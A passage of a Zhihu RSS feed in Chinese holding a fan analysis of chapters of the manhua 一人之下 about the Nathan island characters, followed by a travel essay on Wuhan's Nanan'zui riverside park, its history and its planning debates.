data-watermark-src=\"v2-2299bd075ed7fb9789fc70eed98f2ea4\" data-private-watermark-src=\"\"></p>\n<p><b>3.美国工会</b></p>\n<p>还是之前那个论调，目前其实不能肯定贝希摩斯是否完全代表美国异人，毕竟贝希摩斯只是一家公司，而且和哪都通不一样，这家公司是以公司为主体的；服务与“世界人民”的公司，那么我有理由相信美国本土应该还是有类似哪都通的存在；毕竟美国缺席上一次异人大会确实不太可能；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-19e164021f30e6d73f9e2f67e1a21357_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"269\" data-watermark=\"watermark\" data-original-src=\"v2-19e164021f30e6d73f9e2f67e1a21357\" data-watermark-src=\"v2-c2208ff2ba221b6269c0ef88b20aa730\" data-private-watermark-src=\"\"></p>\n<h2><b>纳森岛</b></h2>\n<p>纳森岛已经说了三期了，但这次还是有很多新的个人观点想和大家分享；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af21bfce694261131f83e9444c67a21f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"935\" data-rawheight=\"342\" data-watermark=\"watermark\" data-original-src=\"v2-af21bfce694261131f83e9444c67a21f\" data-watermark-src=\"v2-759d97b4e6ec38a901f4e0640ae890e2\" data-private-watermark-src=\"\"></p>\n<p><b>1.阿方索</b></p>\n<p>首先来说一下小个子阿方索，阿方索这个名字曾为那不勒斯王国皇家所用；不算是一个很常见的名字但是目前没查到有什么隐喻；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3013c9788c8022351a27f1fb3faec5b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"260\" data-watermark=\"watermark\" data-original-src=\"v2-3013c9788c8022351a27f1fb3faec5b6\" data-watermark-src=\"v2-84c29ced3cbe1fcbf89471d20b935135\" data-private-watermark-src=\"\"></p>\n<p>我之前一直以为，纳瑟卫服务于王是因为某种禁制术，毕竟以利亚亲口说过，自己不喜欢在纳瑟的感觉；所以我以为所谓的为诺言而生是他们被禁制术束缚；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1733b6cb156ea70e3b53f0594c8f30af_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"845\" data-rawheight=\"447\" data-watermark=\"watermark\" data-original-src=\"v2-1733b6cb156ea70e3b53f0594c8f30af\" data-watermark-src=\"v2-d55e4c9c45cbc02a3f5ebd89c26a5cf1\" data-private-watermark-src=\"\"></p>\n<p>但看了阿方索的反映后，我感受到纳森卫，至少阿方索对王的认可是完全发自内心的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b47099ecaf78fd7ef3dbb463c2d921aa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"204\" data-watermark=\"watermark\" data-original-src=\"v2-b47099ecaf78fd7ef3dbb463c2d921aa\" data-watermark-src=\"v2-8c35075a749409a035affd13f759043e\" data-private-watermark-src=\"\"></p>\n<p><b>2.纳森王</b></p>\n<p>回来说被宝儿姐干趴下的纳森王，二叔以前就说过如果要画纳森那肯定是个独立的篇章；看得出来纳森卫和宝儿姐一样是个姑娘；至于势力，宝儿姐当时算偷袭，也不能确定王的真实实力；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-00cb0fd1f8df66de93f849444e86aa6e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"335\" data-watermark=\"watermark\" data-original-src=\"v2-00cb0fd1f8df66de93f849444e86aa6e\" data-watermark-src=\"v2-8d492d885c11ec1859d180ba9ad5750b\" data-private-watermark-src=\"\"></p>\n<p>不过有一点可以肯定，就是以利亚说的：王，是神选之人；是异人中的异人；所以王的天赋是毋庸置疑的；所以以利亚才能那么坦诚的说：我们并不是神选之人，</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6a62bcbbd5df67c8c65fda0ec9f87669_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"264\" data-watermark=\"watermark\" data-original-src=\"v2-6a62bcbbd5df67c8c65fda0ec9f87669\" data-watermark-src=\"v2-66849892736005eface7d9773cdd97a3\" data-private-watermark-src=\"\"></p>\n<p>纳森王异人中的异人这点，其实也和宝儿姐非常相似；这却也是张怀义一直叮嘱张楚岚避免成为的人；木秀于林风必摧之；也许正是因此当年大祭司才规定了纳森卫保卫纳森王的传统吧；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e3e4664051dec51b1873b347f57196a9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"316\" data-watermark=\"watermark\" data-original-src=\"v2-e3e4664051dec51b1873b347f57196a9\" data-watermark-src=\"v2-df5dd4d3e0ff91118e40d4fff93bd838\" data-private-watermark-src=\"\"></p>\n<p><b>3.投石问路</b></p>\n<p>这里还有一个问题，那就是他们为什么要袭击三哥？或者说为什么要丢石头？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e99954fe51e74ab9e6adf21c63b0d3a3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"251\" data-watermark=\"watermark\" data-original-src=\"v2-e99954fe51e74ab9e6adf21c63b0d3a3\" data-watermark-src=\"v2-2cd2c1e2901f5a87d598732be038d01c\" data-private-watermark-src=\"v2-b697507364d57b1b6f75716acde6ef50\"></p>\n<p>事出反常必有妖；按照以利亚和阿方索的对话来看，他们仿佛已经知道了会有拦车？甚至这后面的事情可能都有一部分的安排好的；（应该不包括王被暴打）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f022f952062c2ad9c16e65570578d746_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"741\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-f022f952062c2ad9c16e65570578d746\" data-watermark-src=\"v2-a3dbbfe867e4b021f66a90fabfd56937\" data-private-watermark-src=\"v2-21ac012c6fa563d5a14d1b185002b28c\"></p>\n<p>那如果是这样纳森方面可能真的拥有某位可以预判危机的角色来策划了这场事件？如果把投石和预判这两个关键词结合起来，去找西方传说中的对应；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1dfea935cdd8bba4d26e4ac7f245933e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"207\" data-watermark=\"watermark\" data-original-src=\"v2-1dfea935cdd8bba4d26e4ac7f245933e\" data-watermark-src=\"v2-6905b714317a8b72e9d498ee4d2bea8d\" data-private-watermark-src=\"v2-55def948b3f4e2875524d62f7dc62410\"></p>\n<p>大卫投石；取材于《旧约》中的神话故事。大卫是一个圣经中的人物，公元前1010年至970年是以色列王。他在位时推翻了异族非利士人的统治，使以色列得到统一。打倒巨人歌利亚的投石器。五块石头代表大卫的宽容，四次会打偏，而第五次必然会命中，并打倒敌人。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-efd9e0a88297551d35e8251d6fce4bb1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"736\" data-rawheight=\"244\" data-watermark=\"watermark\" data-original-src=\"v2-efd9e0a88297551d35e8251d6fce4bb1\" data-watermark-src=\"v2-ba2e7596705519f56c8c546d4a9a7fb3\" data-private-watermark-src=\"v2-a8144fed3b22027e1aaa8b6c347020cd\"></p>\n<p>（以上仅为个人猜测）</p>\n<p><b>个人想法</b></p>\n<p>这个世界上不是所有秘密的答案都叫无根生的，如果是那样的话，那这个世界也太无趣了；其实二叔之前在创作的时候就提到过将来会做外国异人的番外，未知的世界才是更真实有趣的世界；期待后续篇章的更新；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91e9c0805ee04798b1f7f6b9d315f18e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"192\" data-watermark=\"watermark\" data-original-src=\"v2-91e9c0805ee04798b1f7f6b9d315f18e\" data-watermark-src=\"v2-2870708ebaf07db1f026dd48f16786df\" data-private-watermark-src=\"v2-8fa7ecd0ef22b3672c985808e84ee49d\"></p>\n<hr>\n<p>以下是之前对纳森岛和外国异人的整理和猜测，为了节省篇幅就不在这里赘述了：</p>\n<a href=\"https://www.zhihu.com/question/466970964/answer/1959555863\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-8a848cb4bd5f11f7f3a1b2b24210d254_200x0.jpg\" data-image-width=\"948\" data-image-height=\"2000\" class=\"internal\">如何评价《一人之下》532（565）话？</a><a href=\"https://www.zhihu.com/question/464193183/answer/1934211068\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-bdba958ccddc978a4ff42f0c80af1423_bh.jpg\" data-image-width=\"1600\" data-image-height=\"720\" class=\"internal\">如何评价《一人之下》530（562）话？</a><a href=\"https://www.zhihu.com/column/c_1264966216768692224\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-28243c09e18dc58c62df761ed87850a5_l.jpg\" data-image-width=\"167\" data-image-height=\"167\" class=\"internal\">一人之下•门派录</a><p><img src=\"https://pic4.zhimg.com/v2-5c10e13da4092b73d90f0456e1b82aee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"254\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>整理不易，跪求点赞<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">57 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/317204661?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》402话？</a><br><a href=\"http://www.zhihu.com/question/304359766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一人之下中的马仙洪各位怎么评价？</a><br>\n","link":"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉有哪些隐藏在城市深处的小众古迹？","date":"2021-07-02 06:45:08","description":"\n<p><b>【野岛乐园南岸嘴】</b><br></p>\n<p>南岸嘴衔住一清一浊，180亩野岛藏着令人心旌荡漾的平价夏天，它是一块穿越旧时光的城中飞地，不办一场户外音乐节，实在可惜。</p>\n<p><br></p>\n<p>武汉许多地方，久仰大名、却从未去过。南岸嘴是其一。</p>\n<p><b>长江和汉水在南岸嘴相遇。</b>龟山的绿意葱茏往江心延伸出一块绿色半岛，汉水绕过半岛尖尖汇入长江。南岸嘴就是那块半岛。</p>\n<p><b>这里是武汉人不敢妄动的一块地。</b>1998年以前，南岸嘴住满人。抗洪之后，修堤治水，老居民全部搬离。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-94583e264e10b5d9cc9a7b5498a3e995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"3243\" data-watermark=\"original\" data-original-src=\"v2-94583e264e10b5d9cc9a7b5498a3e995\" data-watermark-src=\"v2-231f305e19e34ade81c00a88b818115a\" data-private-watermark-src=\"v2-206c6ff8d954dbcfa5fcf270ad658a30\"></p>\n<p><br></p>\n<p>两江交汇核心地段，上海陆家嘴集齐三件套，重庆朝天门扬起百亿“风帆”来福士，我们南岸嘴就不一样了，<b>“闲置”20多年，不种高楼，专注种树，至今仍是一座绿色滨江公园。</b></p>\n<p>一次办公室闲聊，同事说他招待外地朋友玩武汉，南岸嘴是必去的一站，“去了每个人都哇哇惊叹，屡试不爽。”</p>\n<p>今年夏天，我第一次“登岛”南岸嘴，同事所言不虚，<b>仿佛误入80、90年代的武汉，一座充斥旧浪漫的野趣乐园。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8f16df17ad7293e8e1319af51aa16dc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"188\" data-watermark=\"original\" data-original-src=\"v2-8f16df17ad7293e8e1319af51aa16dc4\" data-watermark-src=\"v2-59b22a400f013031da5c18a56ead8128\" data-private-watermark-src=\"v2-8cdcf2b9e822056d8f16cc42bff74bd1\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2878711a541ee431d9c1859e72acc7c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-2878711a541ee431d9c1859e72acc7c0\" data-watermark-src=\"v2-77608542cad43a2647f33e254bf5e479\" data-private-watermark-src=\"v2-500ee6efa6c6afa9787f182a67e50940\"></p>\n<p><br></p>\n<p>南岸嘴江滩公园入口没有招牌。跟着导航七弯八拐，穿过两根贴瓷砖的大白柱，就算进了公园。泥土和树叶香气扑面，往深处走近河堤，闻到淡淡藻腥。</p>\n<p><br></p>\n<p>作为一个城市中央的公园，<b>南岸嘴没有标配的健身器材，全靠自娱自乐。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a4225bdf601e4c3a5aac02d85493328b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-a4225bdf601e4c3a5aac02d85493328b\" data-watermark-src=\"v2-5f74f073cc28c1fe6bfd79bd3148e0d7\" data-private-watermark-src=\"v2-e469e46c00b680c1f637c9dcb92f3564\"></p>\n<p><br></p>\n<p><b>空地画白线，便有了网球场</b>，绿树环绕，自带水景，折服于民间智慧。</p>\n<p>晴川桥下，一条泳裤扎进夏天。空手而来，黑轮胎救生圈十元一租，<b>泳衣现场购买，随到随玩。</b>没有更衣室，临时起意的T恤牛仔裤在河堤堆成小山，白袜子塞进棕色皮凉拖。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e816f943a076ec5165225575ace3a9ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e816f943a076ec5165225575ace3a9ee\" data-watermark-src=\"v2-18c593cb92f9846eb9af22f98ad4b6a3\" data-private-watermark-src=\"v2-e718c1d244c457399d78680f41629bb8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4bec2a5b6d7a303eae598716f7fc9076_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4bec2a5b6d7a303eae598716f7fc9076\" data-watermark-src=\"v2-27cac5eeb016b86a684dcea59e7c1c4c\" data-private-watermark-src=\"v2-4b9a699c6d0b95f384328d2ad985cb2f\"></p>\n<p><br></p>\n<p>打气球，十元一盘，长发及腰的女老板鼓起腮帮子吹气球，播放上世纪的动次打次，在夜幕降临时与对岸 IM HAN 酒吧隔岸和鸣。</p>\n<p><b>街头游戏仅需10元。爱情免费。</b></p>\n<p>江堤上的人在夜里分两派：一人一竿的钓友，成双成对的恋人。</p>\n<p>恋人们相互依偎，看黄鹤楼点亮，二七桥、二桥、大桥、鹦鹉洲、杨泗港依次璀璨。面朝绿地中心，背靠龟山电视塔，<b>平视这座城市从今往后的天际线，仰望此刻的月亮和历代的星辰。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb16bb959be46dcc44657a69567e9afd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-fb16bb959be46dcc44657a69567e9afd\" data-watermark-src=\"v2-f39468465b9ea2da05a596235ad874bb\" data-private-watermark-src=\"v2-934815cad1a26c59fa272169d5646845\"></p>\n<p><br></p>\n<p>在南岸嘴，双目进化成鱼眼，<b>江景视野超300°开阔。这里听到的汽笛声比别处江滩大一些</b>，我以为是幻觉，问了许多人都有相同感受。</p>\n<p><b>南岸嘴衔住一清一浊，180亩野岛藏着令人心旌荡漾的平价夏天</b>，它是一块穿越旧时光的城中飞地，不办一场户外音乐节，实在可惜。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-65c69499fe1510f2e0f0f36ee5f1e9ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-65c69499fe1510f2e0f0f36ee5f1e9ad\" data-watermark-src=\"v2-7a19b453d04284cf7a8a8573f740ce9d\" data-private-watermark-src=\"v2-4a4e59907d827c7560c9d75683f1ae29\"></p>\n<p><br></p>\n<p>这里与武汉无限远，又无限近。<b>城市中央凭空长出一片森林</b>，出逃此地，又被江景壮阔和生猛野趣包围夹击。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-480d054d1e8d475c1bfde6f17a23e877_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"205\" data-watermark=\"original\" data-original-src=\"v2-480d054d1e8d475c1bfde6f17a23e877\" data-watermark-src=\"v2-5b781b2ced2fbefb84fee5d1e933f8fa\" data-private-watermark-src=\"v2-af9f5125d928424cd165f5378f3dc962\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6cb19ea8d5e39859ca37474042fb5c08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1592\" data-watermark=\"original\" data-original-src=\"v2-6cb19ea8d5e39859ca37474042fb5c08\" data-watermark-src=\"v2-39443a5b3846572f92f45ec96587ab1a\" data-private-watermark-src=\"v2-b81e1a65102964ec9db1423b58480e33\"></p>\n<p><br></p>\n<p>来寻乐的大多是汉阳居民。也有六渡桥拐子骑电动车来漂流，车后挂一黑轮胎，车前载一黑一黄两条田园犬，过桥就到，不远。</p>\n<p><b>人在车胎仰卧，顺水漂，狗在岸上跟着跑</b>，漂到南岸嘴起水，到树荫下走两盘棋。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d8b759dd36bd2f08c3e46c6463c16530_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-d8b759dd36bd2f08c3e46c6463c16530\" data-watermark-src=\"v2-c53711f8ee2859365f2ef052d4ca8f88\" data-private-watermark-src=\"v2-eec44bc57c038faafda56ede0eb5a435\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-248c5a04477676ada5ab4753b4239528_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1599\" data-watermark=\"original\" data-original-src=\"v2-248c5a04477676ada5ab4753b4239528\" data-watermark-src=\"v2-e7fbea022ab4fdeffa76db01d4688c5e\" data-private-watermark-src=\"v2-091d22e804d6b9f66f0edc9d7bb723ba\"></p>\n<p><br></p>\n<p><b>南岸嘴男子俱乐部，一个松散组织，或者说几乎没有组织。</b>没有微信群约时间，没有固定接头地点，沿堤岸支起鱼竿，先到先占据有利地形，席地摆开楚河汉界，棋逢对手一坐一下午。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e0991218545aa44a16b4112ecfcbbd61_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1614\" data-watermark=\"original\" data-original-src=\"v2-e0991218545aa44a16b4112ecfcbbd61\" data-watermark-src=\"v2-483edd5ecdf4c5e6cf0d9b317c9df1b4\" data-private-watermark-src=\"v2-d53e69724ee930ab27e09a0fb7274d82\"></p>\n<p><br></p>\n<p>多年混得脸熟，玩高兴了会在天黑之后约着喝点小酒，宵个夜再回家。至于下次何时相见，全靠有缘。</p>\n<p>住钟家村的男人，双肩包拉链伸出一把网球耙子，<b>他说这里是武汉的肺，一块宝地。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-89c1fa8f6d3c9918e40a49f6f163d026_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-89c1fa8f6d3c9918e40a49f6f163d026\" data-watermark-src=\"v2-76604b4dd6a8b939e0e694dec8701b7e\" data-private-watermark-src=\"v2-aa7986cdb6bf6ea3c2a75ee2367849d7\"></p>\n<p><br></p>\n<p>“南岸嘴”地名有典故，相传明朝嘉靖皇帝从安陆（今钟祥）赴京登基，乘船经此。官员百姓肃立汉水两岸，争相一睹龙颜，<b>接驾渡口被称为“接驾嘴”和“南岸接驾嘴”</b>，谐音流传成了“集家嘴”和“南岸嘴”。</p>\n<p>明清时期，南岸嘴连同汉口沿河一带是交通、商贸要津。1998年以前，这里是一片密集民居。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-beebd9509c225a11c93253075cf6946d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-beebd9509c225a11c93253075cf6946d\" data-watermark-src=\"v2-68f930b774997ef6e55832c3d4db9361\" data-private-watermark-src=\"v2-e6986801691a14aa9a54a78b80580f60\"></p>\n<p><br></p>\n<p>从龟北路国棉社区十分钟走到南岸嘴。高公街走到头，晴川桥桥墩下是从前的渣砖二巷。夏天爬船顶跳水，汛期过后，<b>蹲在退水的沙土堤挖铜钱</b>。这里的人记忆中都有一个消失于湍流的小伙伴，有人说是被码头趸船吸了去，有人说淹死的都是会游泳的。不会水的人不敢往江心。</p>\n<p>两江交汇处水患不断，洪峰过境，南岸嘴只剩一片红屋顶。1998年后，政府出资，2650余户居民迁至安全地带。<b>汉阳桃花岛城市花园小区，80%居民曾在南岸嘴生活。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5477d4c11bbae8545b1c03240223e138_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"742\" data-watermark=\"original\" data-original-src=\"v2-5477d4c11bbae8545b1c03240223e138\" data-watermark-src=\"v2-914447b417792083e080e8f5b7dadf4f\" data-private-watermark-src=\"v2-a40e64c32204c6ddba6ef7079f548c69\"></p>\n<p><br></p>\n<p>二十年前依依离别，原住“岛民”常会回家看看。<b>绿荫蔽日，已不是从前巷陌拥挤。对比两江对岸的华灯高楼，南岸嘴密林又仿佛停住了时间。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7ebffdac8353399594fe59fc5b8e992e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"193\" data-watermark=\"original\" data-original-src=\"v2-7ebffdac8353399594fe59fc5b8e992e\" data-watermark-src=\"v2-562928245822a4ebe577ac06c810043b\" data-private-watermark-src=\"v2-074e7de3152e7ad895ad80bb9719db62\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e6978dc5e916008ad396b342176e388_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1464\" data-watermark=\"original\" data-original-src=\"v2-1e6978dc5e916008ad396b342176e388\" data-watermark-src=\"v2-4ea27710b345a1a83dd164ff7640f449\" data-private-watermark-src=\"v2-02d54c23976de6e25664772bf7ffdc3b\"></p>\n<p><br></p>\n<p><b>“谁不想打这里主意？这是蛮宝贵的地方啊，一般的开发商，想都莫想。”</b>家住郭茨口的白发爷爷，望着南岸嘴尖尖角，吐字有力。</p>\n<p>为了看这几天的灯光秀，爷爷搬塑料板凳，六点不到就到南岸嘴占位置，他说，孙姑娘今年四岁，没看过长江，“这里是看江最好的地方。”</p>\n<p><b>最后一批居民在2000年搬离。此后，南岸嘴规划多次列入“两会”议题。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-23957cda4aec05b3908e365b88ede3a7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\"></p>\n<p><br></p>\n<p><b>2001年，武汉面向全球征集南岸嘴规划</b>，在武展办了一场展览，展出来自东京、香港等地11个入围方案。南岸嘴出生长大的朱师傅和老朋友专程去看，有的说要建450米高金色龙塔，有的是酷似卢浮宫的水晶三角锥，还有片片白帆构筑的音乐厅……</p>\n<p>南岸嘴被誉为“中国角”，传说中国丹田在这里，其实是地形与“德国角”相似。德国科布伦茨，莱茵河与摩泽尔河交汇，德国角竖立着威廉一世雕像。</p>\n<p><b>武汉市民之家、琴台大剧院都曾考虑落址“中国角”。20多年过去，地标建筑没等来，南岸嘴依旧亭亭如盖。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-92f85469cf412d533f012f9a1d0b0fc5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-92f85469cf412d533f012f9a1d0b0fc5\" data-watermark-src=\"v2-547e0e204a45192b729c4b06a4ac83d2\" data-private-watermark-src=\"v2-f9f06beff4749a6d48c005df362bc6ad\"></p>\n<p><br></p>\n<p>有人惋惜南岸嘴冷清，也有人说武汉不缺地方盖楼，保留绿色滨水公园，蛮好。（要是路灯修好，公厕弄干净，更好）</p>\n<p>伸入江心的尖尖角是天然水位指标，<b>枯水期露出边缘参差的滩涂沙地，走上去离江心特别近。</b>夏天水涨至防护堤，画出一条平顺的弧。</p>\n<p>运送白砂的船只在龙王庙打舵入汉水，像利刃入喉，接近晴川桥时，依照岸边写有“鸣”字的指示牌，拉响汽笛。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e222841d26a2627262da0f451167644f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e222841d26a2627262da0f451167644f\" data-watermark-src=\"v2-c53d4c47698dbb8fb60ae47893a71e21\" data-private-watermark-src=\"v2-b612ed8cc6097d5f02a40a1adeed338f\"></p>\n<p><br></p>\n<p>向武汉市规划局的朋友打探南岸嘴最新消息，回复是：“还没定，目前是不动。”</p>\n<p>也好。没想清楚，宁可不动。<b>留白总比留遗憾要好。</b></p>\n<p><br></p>\n<p>///</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-eb68b99059346d5c97d0bf0f01056997_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-eb68b99059346d5c97d0bf0f01056997\" data-watermark-src=\"v2-70fff652966bff1f4325e79497200bdc\" data-private-watermark-src=\"v2-195ea030f64756a55eb0318296209ac1\"></p>\n<p><br></p>\n<p>从武昌坐轮渡过江，大桥、电视塔、晴川桥，渐入眼帘。船行接近南岸嘴，心生好奇，突出的绿色半岛上面什么样？<b>怎么一清一浊交融了几百年还没混成一种颜色？</b></p>\n<p>没等回过神，船舷侧转，向江汉关驶去。</p>\n<p>汉水流至汉阳，在相当长一段时间里，并不存在一个稳定的入江口。放荡摇摆的汉水在明朝成化年间有了定性，择龟山北面注入长江。</p>\n<p>再后来，汉水以北诞生东方芝加哥，汉水以南的尖尖角，帆船点点停泊，<b>商贾百姓迎来送往，如今又回归芳草萋萋。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-cb83a16d9268dedd0b33f31216e6a4fd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1682\" data-watermark=\"original\" data-original-src=\"v2-cb83a16d9268dedd0b33f31216e6a4fd\" data-watermark-src=\"v2-89799b851113add84ed2c5360991a635\" data-private-watermark-src=\"v2-118295da4c92b45cdf0c853749fcf516\"></p>\n<p><br></p>\n<p>下午五点，穿黑色泳裤的大桥局电焊工，牵出不满半岁的马犬，到南岸嘴调教狗子水性。</p>\n<p>五点半，一家三口推冰箱到晴川桥下支摊，卖冰水和烤肠，等待六点，跑步团喊口号健步如飞。</p>\n<p>太阳落山后到南岸嘴，嗅觉是最先打开的感官，泥土草腥，因为除了江堤一带，夜晚这里几乎没有路灯，树多蚊子多。<b>热闹的灯光秀借给南岸嘴微弱的光，老婆婆说这样也好，“鸟不会核跑</b>（吓跑）<b>。”</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-916220113ff288bddbd433a1fb4d1919_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-916220113ff288bddbd433a1fb4d1919\" data-watermark-src=\"v2-685a37930e1af4caee7643a1785029a1\" 